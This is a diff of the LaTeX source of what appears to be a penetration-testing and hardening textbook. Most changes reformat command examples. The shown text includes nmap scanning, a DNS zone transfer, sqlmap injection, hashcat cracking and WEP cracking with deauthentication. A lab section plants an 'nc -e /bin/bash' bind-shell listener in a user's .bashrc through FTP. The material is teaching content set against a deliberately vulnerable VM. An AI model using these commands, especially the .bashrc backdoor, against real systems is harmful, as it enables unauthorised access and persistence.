@@ -58,7 +58,7 @@
 \definecolor{mygreen}{rgb}{0,0.6,0}
 \definecolor{mygray}{rgb}{0.5,0.5,0.5}
 \definecolor{mymauve}{rgb}{0.58,0,0.82}
-
+\usepackage{xcolor}
 \usepackage{listings}
 \AtBeginDocument{\renewcommand{\thelstlisting}{\thesubsubsection.\arabic{lstlisting}}}
 \def\l@lstlisting#1#2{\@dottedtocline{1}{3em}{3.5em}{#1}{#2}}
@@ -78,8 +78,20 @@
 	basicstyle=\small\sffamily,				%
 	columns=fullflexible,					%
 	breaklines=true,		            	%
+	literate={%								
+    	*{0}{{{\color{red}0}}}1					%
+    	{1}{{{\color{red}1}}}1					%
+    	{2}{{{\color{red}2}}}1					%
+    	{3}{{{\color{red}3}}}1					%
+    	{4}{{{\color{red}4}}}1					%
+    	{5}{{{\color{red}5}}}1					%
+   		{6}{{{\color{red}6}}}1					%
+	    {7}{{{\color{red}7}}}1					%
+   		{8}{{{\color{red}8}}}1					%	
+	    {9}{{{\color{red}9}}}1},				%
 	stringstyle=\color{mymauve}}
 \lstloadlanguages{C}
+\lstloadlanguages{bash}
 \lstloadlanguages{Python}
 \definecolor{lightgray}{rgb}{.9,.9,.9}
 \definecolor{darkgray}{rgb}{.4,.4,.4}
@@ -99,6 +111,21 @@
   morestring=[b]',
   morestring=[b]"
 }
+\lstdefinelanguage{nmap}{
+  keywords={ssh, domain, pop3, netbios, imap, samba, nfs, telnet, http, https, rpcbind, exec, login, shell, ingreslock, mysql, postgresql, vnc, X11, irc, microsoft, ftp}, 
+  keywordstyle=\color{blue}\bfseries,
+  ndkeywords={tcp, udp, open, closed, VMware},
+  ndkeywordstyle=\color{darkgray}\bfseries,
+  identifierstyle=\color{black},
+  sensitive=false,
+  comment=[l]{//},
+  morecomment=[s]{/*}{*/},
+  commentstyle=\color{purple}\ttfamily,
+  stringstyle=\color{red}\ttfamily,
+  morestring=[b]',
+  morestring=[b]",
+  numbers=none
+}
 \lstdefinelanguage{bind}{
   keywords={options, directory, allow-transfer, allow-recursion, logging, channel, file, severity, print-severity, print-time, category, default, zone, type, allow-update, TTL, IN, SOA, A, NS, CNAME, MX, PTR}
   keywordstyle=\color{blue}\bfseries,
@@ -113,6 +140,20 @@
   morestring=[b]',
   morestring=[b]"
 }
+\lstdefinestyle{CLI} {%
+	language=bash, 
+	numbers=none,
+	showspaces=false, 						%
+	showtabs=false, 						%
+	showstringspaces=false, 				%
+	commentstyle=\color{black}, 			%
+	tabsize=1, 								%
+	keywordstyle=\color{blue}, 				%
+	extendedchars=true,     			    %
+	basicstyle=\small\sffamily,				%
+	columns=fullflexible,					%
+	breaklines=true,		            	%
+	stringstyle=\color{mymauve}}
 %Sorting code floats. 
 \usepackage{float}
 \floatstyle{ruled}
@@ -585,7 +626,7 @@
 
 			\subsubsection{Nmap}
 				The following is an nmap scan of the name server:
-				\lstinputlisting{./shellOut/ns.cysec.nmap}
+				\lstinputlisting[language=nmap]{./shellOut/ns.cysec.nmap}
 		\subsection{Debian Wordpress Blog}
 			This VM is the main web server on the network. 
 			It provides a blog, with a number of vulnerabilities, as well as a poorly secured services such as mail and telnet. 
@@ -607,7 +648,7 @@
 					
 			\subsubsection{Nmap}
 				The following is an nmap scan of the web server:
-				\lstinputlisting{./shellOut/ns.cysec.nmap}
+				\lstinputlisting[language=nmap]{./shellOut/ns.cysec.nmap}
 
 
 
@@ -932,10 +973,10 @@
 				
 				
 				You will then want to bring these interfaces up using the following commands:
-				\begin{quote}
-					netctl enable extern0-profile
-					netctl enable intern0-profile
-				\end{quote}
+				\begin{lstlisting}[style=CLI]
+					$ netctl enable extern0-profile
+					$ netctl enable intern0-profile
+				\end{lstlisting}
 
 			\subsection{Set up DNS and DHCP}
 				You will then want to set up the DNS and DHCP services. 
@@ -947,7 +988,7 @@
 				Network Address Translation is the key utility that allows you to communicate through the router. 
 				This will allow you to send and receive data through it, and with some configuration, receive incoming connections. 
 				In order to set this up, run the following commands in order: 
-				\lstinputlisting[numbers=none]{./shellOut/iptablesNat.in}
+				\lstinputlisting[style=CLI]{./shellOut/iptablesNat.in}
 				I recommend putting these commands into a script file and running that. 
 				That way, if you have to make any changes to them or add any new rules, you can put them in the correct place and run the file. 
 				Use the command ``iptables -F'' to clear the table before running the script. 
@@ -955,10 +996,10 @@
 			\subsection{Bring up the services}
 				The services that are required will now have to be brought up and enabled for boot. 
 				This can be done using the following commands:
-				\begin{quote}
-					systemctl start dnsmasq
-					systemctl enable dnsmasq
-				\end{quote}
+				\begin{lstlisting}[style=CLI]
+					$ systemctl start dnsmasq
+					$ systemctl enable dnsmasq
+				\end{lstlisting}
 				Furthermore, for information on how the service is running, run the command ``systemctl status dnsmasq''. 
 
 			\subsection{Conclusion} 
@@ -985,13 +1026,13 @@
 			This will send TCP SYN packets to the specified ports on the target computer, listening for the SYN/ACK response. 
 			If a SYN/ACK packet is received, the port is marked as open, the packet is examined for service fingerprinting and an RST packet is sent to stop the connection and prevent accidental DoS. 
 			Using nmap, the ``-sS'' flag is used to run a SYN scan. 
-			\begin{quote}
-				nmap -sS <Target IP>
-			\end{quote}
+			\begin{lstlisting}[style=CLI]
+				$ nmap -sS <Target IP>
+			\end{lstlisting} 
 			This will output all of the services which are found to be running on the remote system. 
 			A sample output of an nmap SYN scan can be seen below. 
 			Note that this is an exaggerated response, as the target scanned was intentionally vulnerable. 
-			\lstinputlisting[numbers=none]{./shellOut/nmapSYN.out}
+			\lstinputlisting[language=nmap]{./shellOut/nmapSYN.out}
 		\subsection{Other Scan Types}
 			While SYN scanning is useful, it has become easier to detect due to the introduction of IPS with partial connection rules. 
 			These systems will see a number of partial connections within a given time and will lock out the address that the connections came from, effectively halting your scan. 
@@ -1362,9 +1403,9 @@
 				However, this can be subverted to get the server to enumerate the whole network to anyone if it is misconfigured. 
 				There are a number of name servers\footnote{\url{https://digi.ninja/projects/zonetransferme.php}} which are vulnerable to this. 
 				An example of such a zone transfer can be found by running the following command. 
-				\begin{quote}
-					dig axfr @nsztm1.digi.ninja zonetransfer.me
-				\end{quote}
+				\begin{lstlisting}[style=CLI]
+					$ dig axfr @nsztm1.digi.ninja zonetransfer.me
+				\end{lstlisting}
 				The output of this command is left as an exercise for the reader as the output would take multiple pages within this book. 
 				However, this will output all relevant data about the domain that you are targeting. 
 				This is because while you are accessing the name server from outside it's internal zone, you are also transfering into it. 
@@ -1476,9 +1517,9 @@
 
 			To do this, the first step is to determine what the computer you are targeting is running. 
 			This is done using the tool ``nmap'' as below:
-			\begin{quote}
-				nmap -Sv <Target> -p-
-			\end{quote}
+			\begin{lstlisting}[style=CLI]
+				$ nmap -Sv <Target> -p-
+			\end{lstlisting}
 			This will give us a list of the services which are running on the server, as well as their names and ports. 
 			We will be looking at the FTP server, as it is currently allowing plain text authentication:
 			\begin{quote}
@@ -1500,13 +1541,13 @@
 
 			Now that we can alter files on their system, add the following line to their .bashrc.
 			This will open a listener on port 5005 which can be interacted with from any computer on the network. 
-			\begin{quote}
-				nc -l -k -p 5005 -e /bin/bash
-			\end{quote}
+			\begin{lstlisting}[style=CLI]
+				$ nc -l -k -p 5005 -e /bin/bash
+			\end{lstlisting}
 
 			Using FTP with the user name and password that you found, run the following commands:
 			\begin{verse}
-				get .bashrc \\
+				get .bashrc 
 			\end{verse}
 			Exit FTP at this point and edit the required line into the .bashrc then run the following FTP command:
 			\begin{quote}
@@ -1515,9 +1556,9 @@
 			This will mean that as soon as the msfadmin user logs into their account, a shell will be opened on port 5005. 
 
 			At this point, we can get shell access to the computer using the following command:
-			\begin{quote}
-				ncat <target IP> 5005
-			\end{quote}
+			\begin{lstlisting}[style=CLI]
+				$ ncat <target IP> 5005
+			\end{lstlisting}
 			While you will not see it, this will give you access to a shell, but no prompt. 
 			Try any shell command that you know, most will work. 
 			
@@ -1674,17 +1715,17 @@
 				SQLmap will accept a connection string in either of the following forms:
 				\lstinputlisting[numbers=none]{./shellOut/SQLmapDBConnection.in}
 				For example, the following command will output the DBMS banner, all databases and all DBMS users as well as fingerprinting the database. 
-				\begin{quote}
-					sqlmap -d "mysql://admin:admin@192.168.21.17:3306/testdb" -f --banner --dbs --users
-				\end{quote}
+				\begin{lstlisting}[style=CLI]
+					$ sqlmap -d "mysql://admin:admin@192.168.21.17:3306/testdb" -f --banner --dbs --users
+				\end{lstlisting}
 
 			\paragraph{Web Based Attack}
 				This is the more common attack, as it will work through a vulnerable form or request on a website. 
 				For this case, you have to specify the URL as well as what you want from it. 
 				An example of a command for this attack is as follows:
-				\begin{quote}
-					sqlmap.py -u "http://www.target.com/vuln.php?id=1" -f --banner --dbs --users
-				\end{quote}
+				\begin{lstlisting}[style=CLI]
+					$ sqlmap.py -u "http://www.target.com/vuln.php?id=1" -f --banner --dbs --users
+				\end{lstlisting}
 
 				The syntax for this attack is much simpler, requiring only that you provide the URL and what you would like. 
 				However, it can be extended upon by using the ``-l'' flag along with a burp suite log to attempt injection on all requests proxied through burp. 
@@ -1796,9 +1837,9 @@
 			After running the program, you will see an output file containing folders for every type of file that foremost can find, as well as a HTML file with data on what was found. 
 
 			A simple example of using this program would be attempting to pull all .jpg images out of a filesystem image:
-			\begin{quote}
-				foremost -t jpg -i image.dd
-			\end{quote}
+			\begin{lstlisting}[style=CLI]
+				$ foremost -t jpg -i image.dd
+			\end{lstlisting}
 			This same syntax can be used on any file type, while omitting the ``-t'' argument will result in all file types being recognized. 
 			For most of the files you come across, the default options will work, allowing you to just call foremost with the name of the file to scan. 
 
@@ -1942,9 +1983,9 @@
 		All that is required is having Java installed on the system that you are working on and running the provided JAR package. 
 		You will give it both the class files that you wish to decompile, as well as an output directory. 
 		An example of this can be found below:
-		\begin{quote}
-			./procyon.jar *.class -o src
-		\end{quote}
+		\begin{lstlisting}[style=CLI]
+			$ ./procyon.jar *.class -o src
+		\end{lstlisting}
 
 		Furthermore, Procyon will allow you to decompile a JAR file in it's entirety. 
 		All that need be done for this is running the same command as above on the JAR file rather than the individual unpacked classes. 
@@ -3239,9 +3280,9 @@ list = ['one', 'two', 'three'];
 
 		Now that we have a program that is compiling with debugging symbols and running, we can start to use GDB. 
 		The first step is to run GDB on the program like so:
-		\begin{quote}
-			gdb <program>
-		\end{quote}
+		\begin{lstlisting}[style=CLI]
+			$ gdb <program>
+		\end{lstlisting}
 		This will set GDB up to run and take ownership of the process, allowing it to control the execution of the program. 
 
 		\paragraph{List}
@@ -3685,21 +3726,20 @@ list = ['one', 'two', 'three'];
 				However, if the dictionaries that you are using have already been enumerated in such a way, it will likely not produce useful results. 
 				Furthermore, this attack will not run the words from each dictionary separately. 
 				To use this attack, run the top command for GPU or the bottom command for CPU. 
-				\begin{quote}
-					oclHashcat64 -m 0 -a 1 <hash file> <dict1> <dict2>
+				\begin{lstlisting}[style=CLI]
+					$ oclHashcat64 -m 0 -a 1 <hash file> <dict1> <dict2>
 					
-					hashcat-cli64 -m 0 -a 1 <hash file> <dict 1 and 2>
-				\end{quote}
+					$ hashcat-cli64 -m 0 -a 1 <hash file> <dict 1 and 2>
+				\end{lstlisting}
 			\subsubsection{Hybrid Attack}
 				This attack uses the concepts of both the combinator and mask attacks. 
 				This means that you can specify a dictionary and have hashcat add the mask that you give to either the start or end of the word. 
 				Using this means, you can easily run through passwords such as name and birth year combinations. 
 				To conduct this attack, use the command:
-				\begin{quote}
-					oclhashcat -a 7 <mask> <dict>
-					\\or\\
-					oclhashcat -a 7 <dict> <mask>
-				\end{quote}
+				\begin{lstlisting}[style=CLI]
+					$ oclhashcat -a 7 <mask> <dict>
+					$ oclhashcat -a 7 <dict> <mask>
+				\end{lstlisting}
 				
 		\subsection{Rainbow Tables}
 			In both of the previous sections, we have been calculating the hashes which we are testing against the password hash on the go. 
@@ -3774,9 +3814,9 @@ list = ['one', 'two', 'three'];
 		\subsection{Hash Challenges}
 			This first challenge is based on the \href{https://xkcd.com/936/}{xkcd comic ``Password Strength''.}
 			The word-list for this challenge can be found by using the following command on kali linux:
-			\begin{quote}
-				head -n 20 /usr/share/wordlists/rockyou.txt
-			\end{quote}
+			\begin{lstlisting}[style=CLI]
+				$ head -n 20 /usr/share/wordlists/rockyou.txt
+			\end{lstlisting}
 			The password, hashed in MD5 and SHA256 can be found below. 
 			\lstinputlisting[numbers=none,firstline=1,lastline=4]{./shellOut/hashChallenges.data}
 			While you can complete this in any way you like, I recommend either using John's rules, or creating a custom word list and using Hashcat's hybird mode. 
@@ -3949,9 +3989,9 @@ list = ['one', 'two', 'three'];
 					Firejail\footnote{\url{https://firejail.wordpress.com/documentation-2/}} gives an easy way to do this through it's commandline interface. 
 					The command ``firejail <program>'' will execute ``program'' in a sandbox. 
 					For greater security, the following command will block the program from writing to disk, effectively blocking all permanent changes
-					\begin{quote}
-						firejail \verb+--+seccomp \verb+--+private <program>
-					\end{quote}
+					\begin{lstlisting}[style=CLI]
+						$ firejail --seccomp --private <program>
+					\end{lstlisting}
 					While this does not mean that the program cannot be used as a means to attack the machine, it does make it far more difficult. 
 					However, it also means that nothing can be saved from within the program, making it far harder to use. 
 				\subsection{Firewall} 
@@ -3974,63 +4014,63 @@ list = ['one', 'two', 'three'];
 						Please either conduct these steps locally or have another means of getting into the system. 
 						Also before starting, please ensure that there are no iptables rules on your system. 
 						These can be removed by running the command:
-						\begin{quote}
-							iptables-restore < /etc/iptables/empty.rules
-						\end{quote}
+						\begin{lstlisting}[style=CLI]
+							# iptables-restore < /etc/iptables/empty.rules
+						\end{lstlisting}
 
 						The first step in this is to set up the necessary chains with the commands:
-						\begin{quote}
-							iptables -N TCP \\
-							iptables -N UDP \\ 
-						\end{quote}
+						\begin{lstlisting}[style=CLI]
+							# iptables -N TCP 
+							# iptables -N UDP  
+						\end{lstlisting}
 						Then we should set the FORWARD chain which is usually used in routers and NAT to DROP with:
-						\begin{quote}
-							iptables -P FORWARD DROP
-						\end{quote}
+						\begin{lstlisting}[style=CLI]
+							# iptables -P FORWARD DROP
+						\end{lstlisting}
 						For the next part, we will be telling the firewall to allow all outgoing connections. 
 						This is generally a bad idea, but setting up the correct firewall settings is beyond the scope of this. 
-						\begin{quote}
-							iptables -P OUTPUT ACCEPT
-						\end{quote}
+						\begin{lstlisting}[style=CLI]
+							# iptables -P OUTPUT ACCEPT
+						\end{lstlisting}
 						We will now start setting up the incoming rules. 
 						The default rules for this is do drop the packets, meaning that they will not be accepted and no response will be sent. 
 						However, we will then add other rules on top of this to ensure that communication is not lost. 
 						The following rule will allow ICMP messages which have are related to an existing connection to be passed through the firewall. 
-						\begin{quote}
-							iptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-						\end{quote}
+						\begin{lstlisting}[style=CLI]
+							# iptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
+						\end{lstlisting}
 						The second rule will allow all connections on the loopback address, which is designed to allow software on one machine to communicate. 
-						\begin{quote}
-							iptables -A INPUT -i lo -j ACCEPT
-						\end{quote}
+						\begin{lstlisting}[style=CLI]
+							# iptables -A INPUT -i lo -j ACCEPT
+						\end{lstlisting}
 						This next rule will drop all packets which are not valid. 
 						This means that something about the packets does not make sense, such as a corrupted header or an incorrect checksum. 
 						These packets will be dropped with no response as they are often used in network scanning. 
-						\begin{quote}
-							iptables -A INPUT -m conntrack --ctstate INVALID -j DROP
-						\end{quote}
+						\begin{lstlisting}[style=CLI]
+							# iptables -A INPUT -m conntrack --ctstate INVALID -j DROP
+						\end{lstlisting}
 
 						To allow packets coming through this chain to be attached to our new TCP and UDP chains, use the following commands:
-						\begin{quote}
-							iptables -A INPUT -p udp -m conntrack --ctstate NEW -j UDP \\
-							iptables -A INPUT -p tcp --syn -m conntrack --ctstate NEW -j TCP \\
-						\end{quote}
+						\begin{lstlisting}[style=CLI]
+							# iptables -A INPUT -p udp -m conntrack --ctstate NEW -j UDP 
+							# iptables -A INPUT -p tcp --syn -m conntrack --ctstate NEW -j TCP 
+						\end{lstlisting}
 						These next commands will drop all failed UDP and TCP connections. 
 						This is done for security, as a common network mapping technique uses the fact that by protocol, failed TCP packets should reply with an RST packet and failed UDP should reply with an ICMP port unreachable. 
 						The following commands will stop both of these behaviors. 
-						\begin{quote}
-							iptables -A INPUT -p udp -j DROP
-							iptables -A INPUT -p tcp -j DROP
-						\end{quote}
+						\begin{lstlisting}[style=CLI]
+							# iptables -A INPUT -p udp -j DROP
+							# iptables -A INPUT -p tcp -j DROP
+						\end{lstlisting}
 						Finally, we will drop all other protocols in case anything else was attempted. 
-						\begin{quote}
-							iptables -A INPUT -j DROP
-						\end{quote}
+						\begin{lstlisting}[style=CLI]
+							# iptables -A INPUT -j DROP
+						\end{lstlisting}
 						You may also want to open up a number of application specific ports such as port 22 for SSH. 
 						This can be done using the following command:
-						\begin{quote}
-							iptables -A <Protocol> -p <Protocol> --dport <port> -j ACCEPT
-						\end{quote}
+						\begin{lstlisting}[style=CLI]
+							# iptables -A <Protocol> -p <Protocol> --dport <port> -j ACCEPT
+						\end{lstlisting}
 						Finally, this whole setup can be saved using the command ``iptables-save''. 
 
 		
@@ -4067,10 +4107,10 @@ list = ['one', 'two', 'three'];
 			At this point, you should alter some of the default key storage behaviors of OS X such as erasing the key from memory on sleep an enforcing hibernation. 
 			This will mean that you do not have to manually turn off the computer for the encryption to be secure---the system need only be hibernating. 
 			To do this, use the following commands:
-			\begin{quote}
-				sudo pmset -a destroyfvkeyonstandby 1
-				sudo pmset -a hibernatemode 25
-			\end{quote}
+			\begin{lstlisting}[style=CLI]
+				# pmset -a destroyfvkeyonstandby 1
+				# pmset -a hibernatemode 25
+			\end{lstlisting}
 		\subsection{Firmware password}
 			Unlike windows and Linux systems where the UEFI or BIOS are transparent to the user, Apple Mac computers attempt to hide this utility. 
 			While it is not easy to access to the unaware, this is no means of security. 
@@ -4087,23 +4127,23 @@ list = ['one', 'two', 'three'];
 			The default OS X firewall is a good start for a blocking firewall. 
 			However, it will not allow you to monitor connections, nor block outgoing connections.
 			To enable it, use the command:
-			\begin{quote}
-				sudo defaults write /Library/Preferences/com.apple.alf globalstate -bool true
-			\end{quote}
+			\begin{lstlisting}[style=CLI]
+				# defaults write /Library/Preferences/com.apple.alf globalstate -bool true
+			\end{lstlisting}
 			To enable logging of blocked connections:
-			\begin{quote}
-				sudo defaults write /Library/Preferences/com.apple.alf loggingenabled -bool true
-			\end{quote}
+			\begin{lstlisting}[style=CLI]
+				# defaults write /Library/Preferences/com.apple.alf loggingenabled -bool true
+			\end{lstlisting}
 			To drop ICMP ping requests and TCP/UDP traffic on closed ports:
-			\begin{quote}
-				sudo defaults write /Library/Preferences/com.apple.alf stealthenabled -bool true
-			\end{quote}
+			\begin{lstlisting}[style=CLI]
+				# defaults write /Library/Preferences/com.apple.alf stealthenabled -bool true
+			\end{lstlisting}
 			See chapter \ref{ch:NetworkPenetration} for why this would be a good idea. 
 
 			Finally, to prompt you for every application which attempts to receive an incoming connection, rather than allowing signed applications to receive this by default, run:
-			\begin{quote}
-				sudo defaults write /Library/Preferences/com.apple.alf allowsignedenabled -bool false
-			\end{quote}
+			\begin{lstlisting}[style=CLI]
+				# defaults write /Library/Preferences/com.apple.alf allowsignedenabled -bool false
+			\end{lstlisting}
 
 			At this point, you may wish to overcome the inability of the standard firewall for monitoring and out bound connections. 
 			This can be done through either third party firewalls or the kernel firewall, ``pfctl''. 
@@ -4127,14 +4167,14 @@ list = ['one', 'two', 'three'];
 				After using these tools, use tools such as the Unix manual and a web search to determine what the services do. 
 				When reading a ``.plist'' file, look for ``Program'' or ``ProgramArguments'' to determine what the file runs, then search for the program. 
 				To disable a service, use the following command:
-				\begin{quote}
-					sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.apsd.plist
-				\end{quote}
+				\begin{lstlisting}[style=CLI]
+					# launchctl unload -w /System/Library/LaunchDaemons/com.apple.apsd.plist
+				\end{lstlisting}
 				Noting that removing the wrong service will leave you unable to boot, requiring that you enable it again in single user mode.
 				To check which services have been disabled, run the following command:
-				\begin{quote}
-					find /var/db/com.apple.xpc.launchd/ -type f -print -exec defaults read {} \textbackslash; 2>/dev/null
-				\end{quote}
+				\begin{lstlisting}[style=CLI]
+					$ find /var/db/com.apple.xpc.launchd/ -type f -print -exec defaults read {} \textbackslash; 2>/dev/null
+				\end{lstlisting}
 			\subsection{Spotlight}
 				Spotlight is an exceptionally useful tool. 
 				It is by far the quickest way to get information and launch programs on an OS X system. 
@@ -4158,9 +4198,9 @@ list = ['one', 'two', 'three'];
 				However, this can be overcome.
 				The first step is to disable System Integrity Protection. This should not be left permanently however, as it is a good security feature in itself. 
 				In order to do this, reboot while holding \keys{\cmd + \shift + R} and open a terminal. The following command will disable SIP:
-				\begin{quote}
-					csrutil disable
-				\end{quote}
+				\begin{lstlisting}[style=CLI]
+					$ csrutil disable
+				\end{lstlisting}
 				The reverse operation will re-enable SIP when you are done. 
 
 				Now you should install ``coreutils'' from Homebrew or another trusted source and link all relevant binaries in /bin to their Homebrew coreutils equivalent. 
@@ -4172,28 +4212,28 @@ list = ['one', 'two', 'three'];
 				Caching can be done with the dnsmasq program, which will store the results of requests rather than forcing you to request the address on every boot. 
 				Furthermore, this program hooks into dnscrypt to encrypt your DNS traffic. 
 				To install and configure both of these programs, run the following Homebrew script and commands:
-				\begin{quote}
-					brew install dnsmasq \verb+--+with-dnssec \\
-					mkdir -p /usr/local/etc \\
-					cp /usr/local/opt/dnsmasq/dnsmasq.conf.example /usr/local/etc/dnsmasq.conf \\ %TODO: This gets hyphenated. 
-				\end{quote}
+				\begin{lstlisting}[style=CLI]
+					$ brew install dnsmasq --with-dnssec 
+					$ mkdir -p /usr/local/etc 
+					$ cp /usr/local/opt/dnsmasq/dnsmasq.conf.example /usr/local/etc/dnsmasq.conf 
+				\end{lstlisting} %TODO: This gets hyphenated. 
 				At this point, you should configure both dnsmasq and dnssec to your preferences.\footnote{\url{https://wiki.gentoo.org/wiki/Dnsmasq}}	
 				The configuration file is well commented, read through this as it should tell you what you need to enable. 
 
 				Once configured, the following commands will properly install and launch the program. 
-				\begin{quote}
-					sudo cp -fv /usr/local/opt/dnsmasq/*.plist /Library/LaunchDaemons \\
-					sudo chown root /Library/LaunchDaemons/homebrew.mxcl.dnsmasq.plist \\
-					sudo launchctl load /Library/LaunchDaemons/homebrew.mxcl.dnsmasq.plist \\
-				\end{quote}
+				\begin{lstlisting}[style=CLI]
+					# cp -fv /usr/local/opt/dnsmasq/*.plist /Library/LaunchDaemons 
+					# chown root /Library/LaunchDaemons/homebrew.mxcl.dnsmasq.plist 
+					# launchctl load /Library/LaunchDaemons/homebrew.mxcl.dnsmasq.plist 
+				\end{lstlisting}
 				Then enable the local DNS server in the preferences for your network and any VPN that you are using. 
 
 				In order to encrypt this traffic, you will now need to install dnscrypt. 
-				\begin{quote}
-					brew install dnscrypt-proxy \\
-					sudo cp -fv /usr/local/opt/dnscrypt-proxy/*.plist /Library/LaunchDaemons \\
-					sudo chown root /Library/LaunchDaemons/homebrew.mxcl.dnscrypt-proxy.plist \\
-				\end{quote}
+				\begin{lstlisting}[style=CLI]
+					$ brew install dnscrypt-proxy 
+					# cp -fv /usr/local/opt/dnscrypt-proxy/*.plist /Library/LaunchDaemons 
+					# chown root /Library/LaunchDaemons/homebrew.mxcl.dnscrypt-proxy.plist 
+				\end{lstlisting}
 				Then add the following line to ``/Library/LaunchDaemons/homebrew.mxcl.dnscrypt-proxy.plist'':
 				\begin{quote}
 					<string>\verb+--+local-address=127.0.0.1:5355</string>
@@ -4207,9 +4247,9 @@ list = ['one', 'two', 'three'];
 					<string>\verb+--+resolvers-list=/usr/local/share/dnscrypt-proxy/dnscrypt-resolvers.csv</string>
 				\end{quote}
 				Finally, the program can be started with:
-				\begin{quote}
-					sudo launchctl load /Library/LaunchDaemons/homebrew.mxcl.dnscrypt-proxy.plist
-				\end{quote}
+				\begin{lstlisting}[style=CLI]
+					# launchctl load /Library/LaunchDaemons/homebrew.mxcl.dnscrypt-proxy.plist
+				\end{lstlisting}
 
 				This should leave you with a working, cached, validated and encrypted DNS setup. 
 				Ensure that the DNS servers that you are using support this by checking with the website of the provider that you use or 
@@ -4219,18 +4259,18 @@ list = ['one', 'two', 'three'];
 				When OS X connects to a new network it probes the network and launches a Captive Portal assistant if it cannot access the Internet. 
 				This will load up an arbitrary website provided by the network, possibly serving malware with no user intervention. 
 				This feature can be disabled with the following command:
-				\begin{quote}
-					sudo defaults write /Library/Preferences/SystemConfiguration/com.apple.captive.control Active -bool false
-				\end{quote}
+				\begin{lstlisting}[style=CLI]
+					# defaults write /Library/Preferences/SystemConfiguration/com.apple.captive.control Active -bool false
+				\end{lstlisting}
 
 			\subsection{OpenSSL}
 				The OpenSSL version shipped with OS X is vastly out of date, not supporting many newer encryption technologies and causing significant security risks. 
 				Though it may cause issues building some software, it is recommended that you switch to the Homebrew package and deal with these issues as they arise by utilizing the OS X binary temporarily.
 				This version can be installed and linked using the following commands:
-				\begin{quote}
-					brew install openssl \\
-					brew link openssl \verb+--+force
-				\end{quote}
+				\begin{lstlisting}[style=CLI]
+					$ brew install openssl 
+					$ brew link openssl --force
+				\end{lstlisting}
 				Similar issues appear in many of the OS X command line utilities. 
 				You should search them out online. 
 	\section{Windows Hardening}
@@ -4785,17 +4825,17 @@ list = ['one', 'two', 'three'];
 			The first step to a wireless attack is to gather data about the potential target. 
 			This phase uses the tools ``airmon-ng'' and ``airodump-ng'' as a means of setting up the hardware and gathering information about nearby networks. 
 			To set the hardware properly, we must shift the WiFi card into monitor mode:
-			\begin{quote}
-				airmon-ng start wlan0
-			\end{quote}
+			\begin{lstlisting}[style=CLI]
+				$ airmon-ng start wlan0
+			\end{lstlisting}
 			At this point, you will want to run ``iwconfig'' to check how your device driver handles monitor mode, you may find a new device called ``wlan0mon'' which you should use in the next few commands. 
 			Within this output, you should also see that your device has been put into monitor mode. 
 			For the purposes of this section, I will continue to refer to the WiFi device as ``wlan0'' even in monitor mode. 
 
 			We can now start searching for and gathering information about nearby networks. 
-			\begin{quote}
-				airodump-ng wlan0
-			\end{quote}
+			\begin{lstlisting}[style=CLI]
+				$ airodump-ng wlan0
+			\end{lstlisting}
 			This will show you an output of all details listed in the above section for each AP within range, with further information about its power and the number of intercepted beacons. 
 			Furthermore, you will see information about the clients which are connected to nearby APs in the lower block of the output. 
 			%TODO: Program output would be nice. 
@@ -4805,17 +4845,17 @@ list = ['one', 'two', 'three'];
 
 			At this point, we move to targeting just the network that we are attempting to access. 
 			To do this, the ``airodump-ng'' command is used in a more refined manner to create a dump of initialization vectors (IV) which are transmitted between the network and its clients. 
-			\begin{quote}
-				airodump-ng -c <channel> \verb+--+bssid <AP MAC> -w dump wlan0
-			\end{quote}
+			\begin{lstlisting}[style=CLI]
+				$ airodump-ng -c <channel> --bssid <AP MAC> -w dump wlan0
+			\end{lstlisting}
 			Substituting the ``<channel>'' and ``<AP MAC>'' for the relevant information. 
 			This will give you a dump of the IVs which were sent across the network, which can be used to crack the password of a WEP network. 
 			You will need to wait until between 40000 and 85000 IVs have been collected, which may take some time depending on the network traffic at the time. 
 			
 			Once this has been collected, the key can be cracked using ``aircrack-ng''.
-			\begin{quote}
-				aircrack-ng -b <AP MAC> dump-01.cap
-			\end{quote}
+			\begin{lstlisting}[style=CLI]
+				$ aircrack-ng -b <AP MAC> dump-01.cap
+			\end{lstlisting}
 			This will run an offline attack against the IVs collected in the .cap file.
 			This may take a long time, depending on the number and strength of the IVs that were collected.
 			If you have followed this correctly to this point, you should have the network password at the end of the processing of the above command. 
@@ -4827,17 +4867,17 @@ list = ['one', 'two', 'three'];
 			Packet injection does not work on most WiFi cards\footnote{\url{http://aircrack-ng.org/doku.php?id=compatibility\_drivers}}
 			however, when it does work, it allows for a far more powerful attacks. 
 			To ensure that injection is supported by your device, check whether authentication is successful with the following command:
-			\begin{quote}
-				aireplay-ng \verb+--+fakeauth 0 -e <Network Name> -a <AP MAC> wlan0
-			\end{quote}
+			\begin{lstlisting}[style=CLI]
+				$ aireplay-ng --fakeauth 0 -e <Network Name> -a <AP MAC> wlan0
+			\end{lstlisting}
 
 			At this point we can begin to speed up IV collection using ARP-request reinjection. 
 			This works by capturing ARP request packets (used to translate from an IP address to a MAC address) and resending them. 
 			However, this has been blocked as of WPA, making it useful only for WEP networks.
 			The simple method for this uses the following command:
-			\begin{quote}
-				aireplay-ng \verb+--+arpreplay -b <AP MAC> -h <Client MAC> wlan0
-			\end{quote}
+			\begin{lstlisting}[style=CLI]
+				$ aireplay-ng --arpreplay -b <AP MAC> -h <Client MAC> wlan0
+			\end{lstlisting}
 			At this point you will have to wait until an ARP packet is received, collecting IVs in another terminal. 
 			When the ARP packet is received, aireplay-ng will repeat it back at the AP continuously, causing the traffic on the network to increase, thus collecting more IVs. 
 			However, aireplay-ng can send too many ARP packets, causing IV collection to stall. 
@@ -4846,9 +4886,9 @@ list = ['one', 'two', 'three'];
 			The more aggressive way to run this attack is to force the client off the network, making it re-authenticate and refresh its ARP cache. 
 			This also means that you can sniff the ESSID and possibly a keystream when the computer reconnects with the AP, allowing for a wider range of attacks. 
 			To run this attack, run the following command while running an ARP replay and collecting IVs:
-			\begin{quote}
-				aireplay-ng \verb+--+deauth 5 -a <AP MAC> -c <Client MAC> wlan0
-			\end{quote}
+			\begin{lstlisting}[style=CLI]
+				$ aireplay-ng --deauth 5 -a <AP MAC> -c <Client MAC> wlan0
+			\end{lstlisting}
 			This makes ARP replay and IV collection far faster.
 			However, your attack also becomes far more obvious on the network, making it more likely that a attentive user or IDS will notice your attack. 
 			The method used in cracking WEP using IVs contains interesting mathematical and logical concepts. 
@@ -4867,9 +4907,9 @@ list = ['one', 'two', 'three'];
 
